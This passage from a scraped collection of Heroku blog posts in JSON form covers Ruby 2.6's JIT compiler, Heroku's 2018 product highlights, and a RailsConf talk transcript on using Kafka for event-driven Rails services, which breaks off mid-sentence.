easy to start using Specifically in this post, we've covered just one implementation of the lower-right of this diagram: events data \"firehose\", Amazon Redshift and Metabase. Modern web app And while the implementation of this stream processing system can be as simple or complex as you want, Heroku simplifies much of the DevOps of this system via a fully managed Kafka service that is integrated with consuming and producing Heroku apps that can be horizontally and vertically scaled. Heroku’s easy and secure composability allow the data to be moved into an external infrastructure service like Amazon Redshift for analysis with open source tools that can run on Heroku. The system in this post can be provisioned on Heroku in 15 minutes and was built with a team of 2 developers working sporadically over a two week period. Once provisioned it can run with minimal overhead. I want to extend a huge thank you to those who helped me write or otherwise contributed to this post: Chris Castle, Charlie Gleason, Jennifer Hooper, Scott Truitt, Trevor Scott, Nathan Fritz, and Terry Carter. Your code, reviews, discussions, edits, graphics, and typo catches are greatly appreciated. Footnotes 1 While I refer to generate_data , viz , and redshift_batch as apps, they are actually three process types running within the same Heroku app. They could have instead been deployed as three separate Heroku apps. The project was architected as one Heroku app to simplify initial deployment to make it easier for you to test out. Sometimes this is referred to as a monorepo—i.e. code for multiple projects stored in a single repository. datawarehouse streaming data Amazon AWS node.js apache kafka metabase redshift analytics sql event stream kafka", "date": "2018-12-06,"},
{"website": "Heroku", "title": "Ruby 2.6 Released: Just-In-Time Compilation Is Here", "author": ["Jonan Scheffler"], "link": "https://blog.heroku.com/ruby-just-in-time-compilation", "abstract": "Ruby 2.6 Released: Just-In-Time Compilation Is Here Posted by Jonan Scheffler December 25, 2018 Listen to this article The Ruby committers have again continued their annual holiday tradition of gifting us a new Ruby version: Ruby 2.6 was released today, including the long awaited Just-In-Time (JIT) compiler that the Ruby team has been working on for more than a year. Just-In-Time compilation requires Ruby to spin up a compiler process on startup, and we're proud to say that this feature is supported today on Heroku thanks to the diligent efforts of our very own Richard Schneeman . We'd also like to thank fellow Herokai Nobuyoshi Nakada for his effort making sure the new JIT works well with all of the officially supported compilers: GCC, Clang and Microsoft Visual C++. Using Ruby 2.6 on Heroku You can start using the JIT with your Heroku applications today, just add Ruby 2.6 to your Gemfile: source 'https://rubygems.org'\nruby '2.6.0' Make sure you add the --jit flag to your Procfile for any Ruby processes: web: ruby --jit jit_test.rb Alternatively you can set an environment variable for your application to use the JIT: web: RUBYOPT=--jit rails server Note: Using heroku config to specify RUBYOPT currently does not work, but will be supported soon Please think carefully before running anything in production with the JIT enabled, and make sure you have a plan in place to measure the performance of your applications. This would be an excellent time to install New Relic if you haven't already. MJIT, YARV and RTL If you've been following along with the Ruby team's progress you know that Vladimir Makarov first proposed a method-based JIT (MJIT) for Ruby at RubyKaigi 2017. For some additional context around that proposal, and a deeper understanding of JIT compilers and why they're popular, you might enjoy this interview we conducted with Vlad directly after he left the stage in Hiroshima: MJIT: A Method-based Just-In-Time Compiler for Ruby . Vlad's MJIT proposal also included a significant change to the way Ruby runs your code: replacing the existing intermediate representation (IR) known as YARV with another easier to optimize IR called RTL. Alongside Vlad's work on MJIT another prolific Rubyist named Takashi Kokubun (Ruby committer, maintainer of ERB and HAML) began developing a more conservative JIT called YARV-MJIT. As you might deduce from the name, Kokubun's JIT implementation made use of the existing YARV instructions in Ruby, rather than replacing them with RTL as in Vlad's proposal. I've just committed the initial JIT compiler for Ruby. It's not still so fast yet (especially it's performing badly with Rails for now), but we have much time to improve it until Ruby 2.6 (or 3.0) release. https://t.co/7mO5FZM80C — k0kubun (@k0kubun) February 4, 2018 Given the level of risk involved with swapping out YARV for RTL, the Ruby team decided to move forward with Kokubun's approach, and today that work finally becomes available in Ruby 2.6 with the addition of a --jit option. What even is a JIT? A JIT allows an interpreted language such as Ruby to optimize frequently run methods so they run faster for future calls. The implementation details differ between languages, but generally speaking the goal of a JIT is to skip some or all of the interpretation steps that would normally be required for these methods. Why does Ruby want a JIT? Several years ago Matz set a goal for the Ruby team to triple the speed of Ruby by the release of Ruby 3; he named this initiative Ruby 3x3. There have been many performance improvements in Ruby since Matz set this ambitious goal, but we have plenty of work left to do. At this point in Ruby's development, the introduction of MJIT likely represents our best chance of making it to the finish line. Last month at RubyConf Kokubun presented data that showed a 1.8x speed increase for Ruby 2.6 (as compared to Ruby 2.5) when using the new --jit option with the popular optcarrot benchmark, a very impressive gain to be sure. Unfortunately, many alternative benchmarks (e.g. Rails, Sidekiq) have seen decreased performance, presumably because they have a very large number of methods that are called frequently. If you'd like to read more about Kokubun's benchmarking strategy check out his recent post: Ruby 2.6 JIT - Progress and Future . Why is Rails slower? Rails and similar projects with very large numbers of frequently called methods will experience slower performance using MJIT, because the process of optimizing an individual method is actually slower than interpreting that method directly. Ideally this slowdown is absorbed by the increased performance of future calls to the now compiled method, but for large numbers of methods this performance hit becomes significant. Since all of this compilation happens when the methods are first called you'd think that over time Rails would eventually become faster, once your application “warms up”. However, because each of these methods initially consumes about 2MB of memory, the memory required to compile thousands of methods quickly approaches the bounds of most machines. If you're curious about Rails performance specifically take a moment to read Noah Gibbs ' article A Short Update: How Fast is Ruby 2.6.0rc1? JIT Compaction To help solve the many-method issue Kokubun introduced the concept of JIT compaction. As soon as the number of compiled methods approaches the default maximum cache size of 1000 methods, MJIT will combine those methods in memory to reduce their size. This change definitely helps the situation, but it's not enough just yet to make Rails more performant with MJIT. Beyond the size of Rails there are issues with how Rails is actually implemented. The framework makes heavy use of wrapped core classes like HashWithIndifferentAccess , and the present MJIT implementation is optimized to deal with the core objects themselves. The same is true of methods like blank? that only exist in Rails; MJIT is prepared to optimize calls to the actual Ruby methods like empty? , but Rails developers are much more likely to use blank? for the added convenience, and this comes with additional overhead. The future of the Ruby JIT Kokubun anticipates that the --jit option will eventually be removed  and MJIT will be enabled by default. Given that the goal of implementing a JIT in the first place was to speed up Ruby for the most common use cases, it's not likely to happen before MJIT is able to at least match existing Rails performance. Despite those challenges, Kokubun anticipates that MJIT could become the default as soon as Ruby 2.7. Congratulations to Kokubun, Vlad and everyone on the Ruby team for another successful release! Want to Make a Contribution Yourself? The best way to express your gratitude for Ruby is to make a contribution. There are all sorts of ways to get started contributing to Ruby, if you're\ninterested in contributing to Ruby itself check out the Ruby Core community page . Another great way to contribute is by testing preview versions as they’re released, and reporting potential bugs on the Ruby issues tracker . Watch the Recent News page ( RSS feed ) to find out when new preview versions become available. If you don't have the time to contribute to Ruby directly consider making a donation to\nRuby development: Donate directly to Ruby development Thank you for reading and have a wonderful holiday! <3 Jonan Heroku Developer Advocate ruby-2-6 rubyconf rubykaigi mjit JIT ruby", "date": "2018-12-25,"},
{"website": "Heroku", "title": "Heroku in 2018: Advancing Developer Experience, Trust & Compliance, and Data", "author": ["Vikram Rana"], "link": "https://blog.heroku.com/2018-heroku-retrospective", "abstract": "Heroku in 2018: Advancing Developer Experience, Trust & Compliance, and Data Posted by Vikram Rana January 09, 2019 Listen to this article 2018 was an amazing year for Heroku and our customers. We want to extend a big thank you for your feedback, beta participation, and spirit of innovation, which inspires us every day to continuously improve and advance the platform. In the past year, we released a range of new features to make the developer experience more productive, more standards based, and more open. We achieved significant compliance milestones, provided trust controls for creating multi-cloud apps, and improved our existing lineup of data services. With that, we’d like to take a moment and look back at some of the highlights from 2018. We hope you enjoy it, and we look forward to an even more exciting 2019! Advancing the Developer Experience, Standards, and Open Source Everything we do is focused on creating a high-productivity developer experience that brings structure, insight, and simplicity to app development. A few of this year’s highlights include: making it easy to build your app with Docker, making our CI solution even faster, open sourcing our CLI framework, and creating a new cloud native standard for buildpacks. Building Docker Images with heroku.yml Get the flexibility of Docker to package your app with the benefits of Heroku’s developer experience and managed infrastructure. Heroku CI Parallel Tests, API, and UAT Run tests in parallel on up to 16 nodes, trigger test runs via an API, and automate browser UAT with Functionize, SauceLabs, and BrowserStack. CLI Autocomplete for Bash and Zsh Heroku CLI Autocomplete makes your workflow faster and more seamless by completing commands when you press the tab key. Buildpacks Go Cloud Native Cloud Native Buildpacks is a new API standard for turning source code into Docker images without the need for a Dockerfile, retaining the simplicity that has made buildpacks so popular. oclif: the Open CLI Framework Use the same open source framework that powers our CLI to build command line tools for your company, your API, or your development needs. App Webhooks: Easier Accessibility, More Options Manage and create webhooks more easily than ever, right from the Heroku Dashboard. Validating Trust, Achieving Compliance, and Enabling Multi-Cloud Thank you for trusting us to build, run and secure the apps that keep your business running, and for trusting us with your business-critical data. We take this responsibility extremely seriously, and we’re constantly working to keep earning your trust by setting ever higher standards. ISO Certification and SOC2 Type I Attestation With the achievement of ISO 27001, 27017, 27018 Certification and SOC2 Type I Attestation of Heroku’s platform and data services, you can build apps on our trusted platform and simplify compliance for the majority of the stack used to deliver your apps. VPN Support for Private Spaces Create secure connections from Heroku Private Spaces to Google Cloud, on-premises data centers, and other third-party clouds to build a new class of multi-cloud apps. Internal Routing for Private Spaces Deploy apps with endpoints that are routable only within a Private Space and on VPC- and VPN-peered networks. Internal Routing simplifies security and microservices, and enables access to Heroku apps from software running in an AWS VPC. Auto Cert Management, More TLS Options for Private Spaces Heroku Automated Certificate Management and greater TLS cipher suite flexibility make it even easier to build secure web apps in Private Spaces. SSO Improvements: CLI Login and Certificate Management Users can now seamlessly complete their CLI login via SSO from the Heroku Dashboard, reducing the time spent validating credentials. Also, admins can now add up to three SSO certificates at the Enterprise Team level to ensure zero downtime, and receive automated email notifications as certificates approach expiry dates. More Options for Working with and Scaling Data 2018 was a big year for Heroku Postgres. We introduced Postgres PGX—the next generation of our managed Postgres offering— that brings bigger databases, more plan options, and new hardware. We also made it simple to build HIPAA-compliant apps that sync data between Salesforce and Heroku. Postgres PGX: Bigger Databases, Improved Infrastructure, Same Price Postgres PGX plans offer upgraded CPU, memory, and networking, as well as more plan options to keep your database running smoothly at scale. Heroku Shield Connect Use Heroku Shield to build HIPAA-compliant apps with fast, automated bi-directional data sync between Salesforce and Heroku Postgres. Rolling the Heroku Redis Fleet Heroku Engineer Camille Baldock provides a behind-the-scenes look at how we responded to a critical security update to our global Redis fleet. Partner and Ecosystem Experience Our add-on partner ecosystem is a big part of providing a first-class developer experience to end users. This year we enhanced the add-on development experience for partners to make it similar to using the rest of Heroku’s products. New Heroku Partner Portal for Add-ons Partners can now bring add-ons to market more easily with an elegant, visual experience that is similar to the rest of Heroku’s products. Async Provisioning of Add-ons Async provisioning provides a first-class, out-of-band provisioning experience for add-on services that need extended setup time. It makes automated app setup and orchestration easier and less error-prone. Updated Platform API for Partners The Platform API for Partners provides official endpoints that let you introspect security settings, discover other customer instances of the same add-on, and much more. Heroku Buildpack Registry Buildpacks let you build Heroku apps using technologies like Meteor, Elixir, and React. With the Heroku Buildpack Registry, you can easily contribute and share buildpacks with the community. Log in today, give the new features a try, and let us know what you think. And for a little added creative inspiration, download your Heroku artwork here . Enjoy!", "date": "2019-01-09,"},
{"website": "Heroku", "title": "Building a Service-oriented Architecture with Rails and Kafka", "author": ["Stella Cotton"], "link": "https://blog.heroku.com/service-oriented-architecture-rails-kafka", "abstract": "Building a Service-oriented Architecture with Rails and Kafka Posted by Stella Cotton January 14, 2019 Listen to this article This blog post is adapted from a talk given by Stella Cotton at RailsConf 2018 titled \" So You’ve Got Yourself a Kafka .\" Hey, everybody. We're gonna get started. I hope that you're here to listen to me talk about Kafka, 'cause that's the room that you are in. So, yeah. First things first, my name is Stella Cotton. I am an engineer at Heroku. And like I said, I'm gonna talk to you today about Kafka. You might have heard that Heroku offers Kafka as a service. We have got a bunch of hosted plans, from tiny plans to giant plans. We have an engineering team that's strictly dedicated to doing cool stuff to get Kafka running on Heroku in super high capacity. I am not on that team. If you were here to see that talk, this is the wrong talk. I don't actually know anything about running a Kafka cluster or tuning Kafka to handle super high load. So who am I? I am a super regular Rails engineer, like many of you. I wasn't actually familiar with Kafka at all when I joined Heroku. It was like this mysterious technology that suddenly was everywhere. And all these hosted Kafka solutions, not just on Heroku, but on other providers, and Kafka-like systems like Kinesis, they just sprang up. And it seemed important, but I wasn't sure why. And then when I joined Heroku, I am suddenly in this world where not only is Heroku an important part of our product offering, but it's actually a really integral part of our system architecture overall. So today I'd like to talk about three areas that I hope will help other Rails engineers become more familiar with Kafka. We're gonna start with what Kafka is. We'll talk about how Kafka can power your services. And a few, just like two practical considerations and challenges that were kind of unfamiliar to me when I started using event-driven systems. So what is Kafka? The docs on kafka.apache.org, that's actually, the docs are super good, by the way. They describe it as a distributed streaming platform. But that doesn't really mean a lot to me as a web developer. But one of the classic use cases that people talk about for Kafka is data flow. So if you're running an e-commerce website, for example, you want to know more about what your users are doing on that platform. You want to track each page they visit, each button they click. If you have a lot of users, this can be a lot of data. And if we want to be able to send that data from our web applications to a data store that our analytics team uses, how could we record and stream that high volume of data? One way is to use Kafka. And the basic data structure that powers Kafka is this idea of an append-only log. And when you think about logs, people here, what do you think about? For most web developers, that's gonna be an application log. When something notable happens in our web applications, we're gonna log it in chronological order, we're gonna append each record to the record prior. And then once that record is persisted in this application log, it's gonna be there indefinitely until we truncate earlier versions of our logs. So in a similar fashion, Kafka is also an append-only log. Kafka has an idea of producers. And those are gonna be applications that produce log events. You can have one producer of events or you can have multiple producers of events. But unlike an application log, which is typically written so that you as a human can consume the log later on using your eyeballs, in the Kafka world, applications are gonna be the consumers of these events. Like with producers, you can have one consumer. You can have a bunch of consumers. And a big question for web developers is often what's different about Kafka than something like Sidekiq or Resque? And in Sidekiq and Resque, events are typically gonna be added to a queue. But once something picks it off to actually do the work, that disappears. In Kafka, it doesn't matter how many consumers are reading these events, those events are gonna continue to persist for other consumers to consume them until a specific retention period is over. So let's go back to our original example, our e-commerce app. We want this e-commerce application to create an event each time a user does something on the platform. We write each of these events or records, which is what Kafka calls events, and you want to do that to a user event log. And Kafka is gonna call a log a topic, basically. And if you have multiple services, they can all write events to this user event topic. And each of these Kafka records that we write, it's gonna have a key and a value, like a hash, and a timestamp. And Kafka's not gonna do any validation on this data. It's just gonna pass along binary data no matter what kind of format it's in. So in this scenario, we're using JSON. But you can use a lot of different kinds of data formats. And the communication that happens between these clients that are writing to Kafka and reading off of Kafka is gonna happen over a persisted TCP socket connection. So it's not gonna have a TCP handshake for every single event. So how can our Rails apps specifically interact with a Kafka cluster? We can use one of a few Ruby libraries. Ruby Kafka is a lower-level library for producing and consuming events. It's gonna give you a lot of flexibility, but it also has a lot more configuration. So if you want to use a simpler interface without a lot of boilerplate setup, there's DeliveryBoy and Racecar, which are also maintained by Zendesk. And also Phobos. And these are gonna be wrappers around Ruby Kafka to kind of abstract away a lot of that configuration. You've also got Karafka, which is a different standalone library. And similarly to Ruby Kafka, it has a wrapper called WaterDrop. And it's based on the same implementation that we saw before with DeliveryBoy. So my team, we actually use a custom gem that pre-dates Ruby Kafka. So I haven't actually used these in production, but Ruby Kafka is gonna be the gem that Heroku is gonna recommend that you use if you look at our dev center documentation. So a brief look at how you can use DeliveryBoy. We're gonna use the simple version. Like I mentioned earlier, built on top of Ruby Kafka. And we can use it to publish events to our Kafka topic. First, we're gonna install the gem. The usual, run a generator. And it's gonna generate this config file, which you're probably pretty familiar if you've used databases. And DeliveryBoy is meant for getting things up and running very, very quickly. So you don't have to do any other configuration except the brokers. Like, give them the address and the port, which it might be local host if you're running it locally. And the DeliveryBoy docs will tell you how you can configure more things, but this is like the MVP. And using DeliveryBoy, we can write an event outside the thread of our web execution to a user event topic. You can see we passed in user event is the topic. And each of these topics can be made of one or more partitions. And in general, you want two or more partitions. Partitions are a way to partition the data that you're sending in a topic. And that allows you to scale your topic up as you have more and more events being written to that topic. And you can have multiple services that are writing to the same partitions. And it's the producer's job to say which partition you're gonna send those events to. DeliveryBoy is gonna help you balance events across those partitions. You can let it just assign your event randomly to a partition or you can actually give it a specific key. And why would you want to give a partition key? It's so that specific kinds of events go inside a single partition. Because Kafka only guarantees that events are delivered in order, like in our application log, inside a partition, not inside a whole topic. So for example, if you want to make sure that your user events related to a specific user all goes to the same partition, you'd pass in a user ID there. And that you would make sure that every event related to a user shows up in order so it doesn't look like they're clicking all around on the website out of order because it's going into different partitions. And under the hood, Ruby Kafka is using a hashing function. So it's gonna convert this into an integer and do a mod to divide by the number of partitions. So as long as your partition count stays the same, you can guarantee that it always goes to the same place. It's a little tricky if you start to increase your partitions. So now we're writing events to our user topic. That's really the only thing we really need to do if you have a Kafka cluster running. You can also use another gem called racecar. Same thing, wrapper around Ruby Kafka maintained by Zendesk. And it's the same, very little upfront configuration. Just this generator. This config file will look familiar 'cause it's pretty much the same. But this will also create a folder called consumers in your application too. And an event consumer subscribes to our user event topic with that subscribes_to method at the topic. And this is just gonna print out any data that it returns. So we're gonna run that consumer code inside of its own process. So it's gonna be running separately from the process that runs our web application. And in order to consume events, racecar is gonna create a group of consumers. It's gonna be a collection one or more Kafka consumers. And it's gonna read off of that user event topic. And each consumer inside that consumer group is gonna be assigned one or more partitions. And each of these are gonna keep track of where they are in these partitions using an offset, which is like a bookmark. A digital bookmark. And the best part is that when one consumer goes away if it fails, those topics are gonna get reassigned to other consumers. So as long as you've got at least one consumer process running, you've got a good availability story. So we talked a little bit about what is Kafka under the hood. And let's talk more about the technical features that make it valuable. So one is that Kafka can handle extremely high throughput. One of the key performance characteristics that I thought was pretty interesting is that Kafka has the message broker, rather, Kafka does not use the message broker like the Kafka cluster to track where all the consumers are. Like a traditional enterprise queuing system like AMQP is going to actually have the event infrastructure itself keep track of all those consumers. And so as your number of consumers scales up, your event infrastructure is actually going to have more load on it. 'Cause it's gonna have to track a larger and larger state. And another thing is that consumer agreement is actually not trivial. It's not easy for the broker itself to know where the consumers are. Because do you mark that message has been processed as soon as it gets sent over the network? Well if you do and the consumer is down and it can't process it, how does the consumer say hey, event infrastructure, actually can you resend that? You could try a multi-acknowledgment process like with TCP. But it's gonna add performance overhead. So how does Kafka get around this? It just pushes all of that work out to the the consumer itself. The consumer service is in charge of telling where am I, what bookmark am I at in that ordered commit log. And so this is kind of cool because it means that reading and writing event data is constant time, O(1). So the consumer either knows that it wants, it has an offset, it says give me this specific place in the log. Or I want to start at the very beginning and read all of the events. Or I want to start at the very end. And so there's no scanning over large sets of data to figure out where it needs to be. And so the more data that exists, it doesn't matter. It doesn't change the amount of time to look up. And so Kafka is going to perform similarly whether you have a very small amount of data in your topics or a large amount of data. And it also runs as a cluster on one or more servers. It could be scaled out horizontally by adding more machines. Extremely reliable. And data is written to disk and then replicated across multiple brokers. So it has this scalable and fault-tolerant profile. So if you'd like to know more about the actual data distribution replication side of Kafka, this is a pretty good blog post. And by the way, the slides will be on the website and I'll tweet them out at the end. So don't bother trying to write down these links, 'cause that would be a little complicated. And so to give you a more concrete number around what scalable looks like, Netflix, LinkedIn, and Microsoft are literally sending over a trillion messages per day through their Kafka clusters. So Kafka is cool. It's awesome. It can get data from one place to another. But we're not in a data science track. We're a track about services. So why do you care about this technology in the context of services? So some of the properties that make Kafka valuable for event pipeline systems are also gonna make it a pretty interesting fault tolerant replacement for RPC between services. If you aren't familiar with the term RPC, there's a lot of different arguments about what it means. But it means Remote Procedure Call. And tl;dr, it's a shorthand for one service talking to another service using a request, like an API call. So what does this mean in practice? Let's go back to our example of the e-commerce site. User is gonna place an order. It's gonna hit this create API in our order service. And when that happens, you'll want to create an order record, charge their credit card, send out a confirmation email. And so in a monolithic system, this is gonna usually be like this method call. It's gonna have blocking execution. You might using Sidekiq or something to handle sending the email. But as your system grows more and more complex, you might start extracting these out to their own service. And you can use RPC, Remote Procedure Calls, to talk between these services. So what's some of the challenges that you might find with using RPC? And so one is that the upstream service is responsible for the downstream service's availability. If the email system is having a really bad day, the upstream service is responsible for knowing whether or not that email service is available. And if not, retrying any failing requests. Or failing altogether. So how might an event stream help in this situation? So in this event-oriented world, an upstream service, our order is API, is going to write an event Kafka saying that an order was created. Because Kafka has this at least once guarantee, it means that that event is gonna be written to Kafka at least once and will be available for a downstream consumer to consume. So if our email service is down, that event is still there, that request is still there. And when the downstream consumer comes back online, it can pick back up, it can use its bookmark and say, I need to pick back up from XYZ and continue to process those events in order. So another challenge that larger and larger organizations find is coordination. In increasingly complex systems, integrating a new downstream service means a change to an upstream service. So if you'd like to integrate a new fulfillment provider, for example, it's gonna kick off a fulfillment process when an order is created. In an RPC world, you need to change that upstream service to make an API call out to your new fulfillment service. In an event-oriented world, you would add a new consumer inside the fulfillment service that's gonna create that order, consume the order created event topic. So there are some upsides. What's the big downside? In our first example, the dependency between those services is super clear. You look at that method and you see oh, this, this, this, and this. The upstream service knows exactly which downstream services depend on knowing that the order was created. By abstracting away that connection, you gain speed, you gain independence, but you do sacrifice clarity. So you've got a Kafka, woo! You're comfortable with the trade-offs, you understand what you're getting into. You'd like to start incorporating events into your service arena and architecture. So what might this look like from an architectural perspective? Martin Fowler discusses how when people talk about event-driven applications, they can actually be talking about incredibly different kinds of applications. And I found this personally to be true, even inside of Heroku. And it can be a big pain point when you're having a discussion about challenges, about trade-offs, in these kind of systems. So he's trying to bring a shared understanding to what an event-driven system is. And he's started outlining a few architectural patterns that he sees most frequently. So I'm gonna kind of zoom through this to cover these. But you can learn more on his website. Or even better, he gave a keynote at GOTO Chicago that really covers this in-depth. So the first pattern he talks about is an Event Notification pattern. This is the absolute bare minimum, simplest, event-driven architecture. One service simply notifies the downstream services that an event happened. The event has very little information, it's just saying an order was created at this time. If the downstream services needs more information about what happens, it's gonna need to make a network call back up to the order service to fill that information out. The second pattern he talks about is Event Carried State Transfer. And in this pattern, the upstream is actually gonna augment that event with additional information so that your downstream consumer can keep a local copy of that data and not have to do that network call. And it can be actually super straightforward when everything that the downstream services needs is encapsulated inside that event generated by the upstream service, which is awesome. Except one of the challenges here is that you might need data from multiple systems. So for example, our order service, it's gonna create an order, write the event. Fulfillment service is gonna consume that event. And the fulfillment service is gonna need certain details about the order, which is totally fine, 'cause we have that order information. And it's gonna be passed along inside the event. But if it also needs to talk to a customer service, for example, to know who to send a package to, it's gonna either need to make a network call to actually retrieve that information like we saw earlier or it needs to find a way to persist a local copy of the data that it needs. And the idea is that you can also consider building that local copy off of events that the customer service is gonna write. And so the fulfillment service is gonna consume a separate set of events from your customer service that it can then persist locally and join it inside of its own database. A third pattern that Fowler talks about is Event-Sourced Architecture. This takes the idea of an event-driven system even further. And it's saying that not only is each piece of communication between your services kicked off by an event, but it says that by storing every single event or storing a representation of every single event and replaying all of these events, you could drop all your databases, completely rebuild the state of your application as it exists in this moment just by replaying that event stream. So Fowler talks about an audit log being a good use for this scenario. He also talks about this really interesting high-performant trading system, which is not really something that's relevant to my interest but might be relevant to yours. But having an audit log of everything that happens and actually relying on it to rebuild your application state is two very different levels of technical commitment. Like, seriously different. There are gonna be additional challenges that come into play when you're looking to be able to recapture this state of the world. So one is code changes. So I worked on a payment system in the past. And a big challenge that we had was if you tried to recalculate prior financial statements, they depended on business logic that lived inside the code, hardcoded in the past. And that had changed. And so if you tried to recalculate all that money that you needed to send out to users based on the state of the world that day, you might actually get different values. And that's a problem. And that was not an event-driven system, so this is an issue even in regular systems. But it's something that you really need to understand when you're relying on the ability to rebuild your state of the world from events. And in a similar fashion, another challenge is that that state of the world might not be the same for third-party integrations. Like, that might have changed and an API callout to a third-party provider might return a different set of data, or even an internal provider. Fowler talks about some more strategies for handling these issues. It's not an insurmountable task, but it is a big deal. And the final pattern that Fowler talks about is Command Query Responsibility Segregation, which if you've ever talked to anybody about event-driven architectures, you might, like I would say 50% of the time, they think you're talking about this. And you may or may not be talking about this. So you might be familiar with CRUD. And that's a way of encapsulating logic for creating, reading, updating, deleting a record in a database inside your service. And it's at the heart of Rails controllers, like this is very Railsy. But the idea of CQRS is that instead of thinking about all those things as existing in the same domain, that you can actually split them out. So the service that writes to your system and the service that reads from your system are actually split. And at its simplest, one service is responsible for writing orders. So any method or API call that feels like an order.create, an order.update_taxes, like whatever, that's gonna go into your order updater service. It's gonna go one direction. And reading methods or API calls like get order by ID, those are gonna live in another service. And it's not just an event-oriented architecture thing, you can do this with API calls. But you'll often see event-oriented architectures, you'll see event systems nestled in the diagrams usually at the place where commands are actually written. The writer service, this command handler, is gonna read off of the event stream, process these commands, store them to a write database, and then any queries are gonna happen to a read-only database. When do you want to use it? CRUD is much simpler. Separating out read and write logic into two different services really does add a lot of overhead. The biggest reason I think people use it is performance. So if you're in a system where you have a large difference between reads and writes or a system where your writes are super, super slow compared to your reads, you can optimize performance separately for those systems. But it's an increase in complexity, so you really need to understand the trade-offs. I found this blog post to be pretty good. Succinct, like the title says, when to use and not use CQRS. And I would also, if you're thinking about implementing any of these patterns in your system, take a look at Fowler's blog posts and watch his keynote to get a really deep dive into the trade-offs and considerations for these. So we talked about what Kafka is. We talked about how this technology can change the way your services communicate with each other. So next, let's talk about two practical considerations that you might run into in integrating events into your Rails applications. It's definitely not a comprehensive list, but it was like, two things that really surprised me when I got started. So the first thing to consider are slow consumers. The most important thing to keep in mind in an event-driven system is that your service needs to be able to process events as quickly as the upstream service produces them. Otherwise, you are gonna drift more slowly and slowly behind and you may not be realizing it because you're not seeing timeouts, you're not seeing API calls fail. You're just slower, you're just at a different state of the world than everybody upstream. And also, you might start to see timeouts. So one place where you will see timeouts are gonna be on your socket connection with the Kafka brokers. If you're not processing events fast enough and completing that round trip, your socket connection can time out. And then reestablishing that actually has a time cost. It's expensive to create those sockets. So that can add latency to an already slower system, making things worse. So if your consumer is slow, how do you speed it up? So there's gonna be a lot of talks at RailsConf today and RailsConf prior about performance in Rails. But a more Kafka-specific example is that you can increase the number of consumers in your consumer group so that you can process more events in parallel. So what does that look like in practice? So you remember in racecar, you run a consumer process by passing in a class name like UserEventConsumer. If you're using a procfile for something like foreman or on Heroku, you can actually start racecar with the same class multiple times. And it's gonna automatically have each of those processes have it be an individual consumer that's gonna join the same consumer group. And so you want at least two of these consumer processes running. So if one goes down, you're gonna have the other failed partitions be reassigned. But it also means that you can parallelize work across as many consumers as you have topic partitions. So of course, with any scaling issue, you can't just add consumers forever. Eventually you're going to hit scaling limits on shared resources like databases. So you just can't scale forever, but it will give you a little bit of wiggle room. And if you don't actually care about the strict ordering inside those topic partitions, you can use a queuing system like Sidekiq to help manage work in parallel and take a little bit of pressure off of the system. And it's extremely valuable, in this case, to have metrics and alerting like paging around how far behind you are from when an event was added to the queue. So Ruby Kafka is instrumented with ActiveSupport notifications, but it also has a StatsD and Datadog reporters that are automatically included. And you want to know if you're drifting a certain amount behind when the events are added. And the Ruby Kafka documentation, which is also super good, has a lot of suggestions for what you should monitoring in your Rails systems. And going one step further, on my team, before we put a new service into production, 'cause we use Kafka for a lot of our services, we'll run gameday failure scenarios on staging but consuming off the production stream where we're move our offset back by a certain amount to pretend like our service has been down for a day or two and see how long it takes us to catch up. Because if you have a serious outage on your downstream service, you're gonna want to know, how much wiggle room do you have? And talk about what failure modes are acceptable for your service. Because if you're running an order service, for example, you might want to optimize for finishing those orders no matter what. It might take you four hours, it might take you a day. But you want it to be done. But if you're running a chat bot service, users are going to be extremely confused if four hours later they start seeing things appear inside of their chat. So you'll want to talk about what that means to process data at a delay. And there are also, so a big thing in Kafka to talk about is this exactly once versus at least once. You can actually design a Kafka system to have an exactly once guarantee with newer versions of Kafka. So it means that consumers could assume that a message in a Kafka queue has only been sent once. There's never a chance that messages will be not sent at all or that it'll be sent more than once. And Confluent has a blog that talks a little bit more about this. But the reality is with Ruby Kafka, you should assume that your messages will be delivered at least once. So it's gonna be there, but you might see it more than once. So it's really important. And one thing that this means is that you need to design consumers to expect duplicated events. So you can either rely on your database and use UPSERT for item potency. Or, hmm. Yes, thank you so much. Got the dance in too. All right, so design your consumers for failure. Rely on UPSERT to lean on your database. Or you can include a unique identifier in each event. And you could just skip events that you've already seen before. But either of those things are gonna make your application more resilient in the face of failure. Because you can move back an offset and replay events and not be worried that you're gonna duplicate the same one twice. And the second thing that was really surprising to me was Kafka's very permissive attitude towards data. You can send anything in bytes and it's gonna send it back out, it's not gonna do any verification. And this feature makes it extremely flexible because you don't need to adopt a specific format, like a serialization format, to get started. Like we talked about before, freedom isn't free. Freedom is a blessing and a curse. What happens when a service upstream decides to change an event that it produces? If you just change that event payload, there's a really good chance that one of your downstream consumers is gonna break and your colleagues are gonna be really upset. And they're gonna start seeing exceptions, it could take down their service. But you have no idea because you didn't really know that anybody was using that data. So before you start using events in your architecture, choose a data format, preferably one, not multiple ones, and evaluate how that data format can help you register schemas and evolve them over time. It's an issue in RPC systems as well. But the explicitness of those calls means that somebody changing an upstream service has a built-in method for being like, oh wait, somebody might actually be using this information. Especially when that's like an outgoing event. Schema registries can provide a centralized view of schemas that are in use in your system. This is also, it's just like much easier to think about validation, about evolution of schemas, before you actually do all of this event-driven architecture than afterwards. And there are a lot of different data formats. But I'm gonna talk about two. JSON, which most people in this room are probably familiar with. It's the format of the web. And Avro, which might be new to some of you. And I know that there are probably at least two Australians in the audience. There's like a 75% chance I'm gonna slip up on the next two slides and call it Arvo, but I do not mean afternoon, I mean Avro. So ignore me. So JSON's a pretty common data format. Pros: human readable, super nice. As a human, I really appreciate that. And there's also JSON support in basically every language. But there are a couple of cons. The payloads, like the actual size of JSON payloads, can be really large. It requires you to send keys along with the values, which is nice 'cause it's flexible, so it doesn't matter what the order is in. But it's also the same for every payload. So when you send them over, it can mean that those payloads are larger than other formats. So if size is a big concern for you, JSON could be a bad fit. There's still not built-in documentation inside that payload. So you just see a value, but you don't actually know what it means. And schema evolution is challenging. There's no built-in support for aliasing one key to another if you want to rename a field or sending a default key value so that you can evolve over time. So Confluent, they're the team that built Apache Kafka. And they now have a hosted Kafka product. They recommend using Avro, like many other protocol formats. It's not human readable over the wire, you have to serialize and de-serialize it because it's sent in binary. But the upside is that there is super robust schema support. A full Avro object is sent over and it includes this idea of the schema and the data. So it has support for types. It's got primitive ones like ints, complex ones like dates. And it includes embedded documentation, so you can say what each of those fields actually do or mean in your system. And it has some built-in tools that help you evolve your schemas in backwards-compatible ways over time. So that's pretty cool. Avro::Builder is a gem created by Salsify. And that actually creates a very Ruby-ish DSL that helps 